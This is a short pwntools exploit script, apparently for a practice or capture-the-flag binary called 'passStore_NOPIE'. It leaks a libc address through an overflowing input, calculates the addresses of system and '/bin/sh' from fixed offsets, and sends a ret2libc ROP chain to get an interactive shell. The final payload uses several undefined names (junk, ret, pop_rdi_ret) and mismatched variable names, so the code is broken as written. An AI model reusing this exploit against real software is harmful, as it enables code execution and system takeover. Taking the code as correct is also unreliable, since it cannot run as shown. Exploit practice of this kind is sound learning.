from pwn import *

r = process("./passStore_NOPIE")
gdb.attach(r , api=True)

payload1 = b"a"*23
r.sendline(payload1)

print(r.recvline())
print("--------------------------------------")
#print(r.recv())
res = r.recv().split(b"\nRetype")[0].strip().ljust(8,b"\x00")
print(str(hex(u64(res))))

set_buf_runtime_addr = u64(res) - 0xbf
set_buf_offset = 0x0000000000081540

libc_base = set_buf_runtime_addr - set_buf_offset
printf_offset = 0x0000000000060770

printf_runtime_addr = libc_base + printf_offset
print("Printf runtime addr : " + hex(printf_runtime_addr))

system_offset = 0x0000000000050d60
binsh_offset = 0x1d8698

system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

payload = junk + p64(ret) + p64(pop_rdi_ret) + p64(binsh_address) +p64(system_address)
r.sendline(payload)

r.interactive()